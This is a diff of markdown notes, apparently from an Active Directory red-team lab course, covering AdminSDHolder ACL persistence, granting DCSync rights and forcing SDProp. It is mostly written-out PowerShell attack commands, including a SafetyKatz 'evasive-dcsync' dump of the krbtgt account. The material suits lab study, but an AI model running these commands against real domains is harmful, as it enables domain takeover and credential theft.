@@ -4,7 +4,7 @@
 
 Add `FullControl` permissions for a user to the `AdminSDHolder` using PowerView as DA
 ```powershell
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student548 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
 Using `ActiveDirectory` Module and [RACE](https://github.com/samratashok/RACE) toolkit:
@@ -22,16 +22,14 @@ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc
 --- 
 ##### **After adding permissions to `AdminSDHolder`, `SDProp` must be ran/updated for the changes to take effect**
 
-Manually run `SDProp`
+Manually run `SDProp` with Invoke-SDPropagator.ps1
 ```powershell
-Invoke-SDPropagator -timeoutMinutes 1 -showProgress -
-Verbose
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 ```
 
 For pre-Server 2008 machines
 ```powershell
-Invoke-SDPropagator -taskname FixUpInheritance -
-timeoutMinutes 1 -showProgress -Verbose
+Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
 ```
 
 --- 
@@ -39,7 +37,7 @@ timeoutMinutes 1 -showProgress -Verbose
 
 PoweView
 ```powershell
-Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
+Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student548"}
 ```
 
 ActiveDirectory Module
@@ -70,8 +68,7 @@ Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Pas
 
 PowerView
 ```powershell
-Add-DomainObjectAcl -TargetIdentity
-'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student548 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
 AD Module
@@ -79,9 +76,18 @@ AD Module
 Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
 ```
 
+Confirm permissions
+```powershell
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student548"}
+```
+Manually run `SDProp` with Invoke-SDPropagator.ps1
+```powershell
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+```
+
 Executing DCSync
 ```powershell
-Loader.exe -path SafetyKatz.exe -args '"lsadump::evasive-dcsync /user:dcorp\krbtgt"'
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt"
 ```
 
 
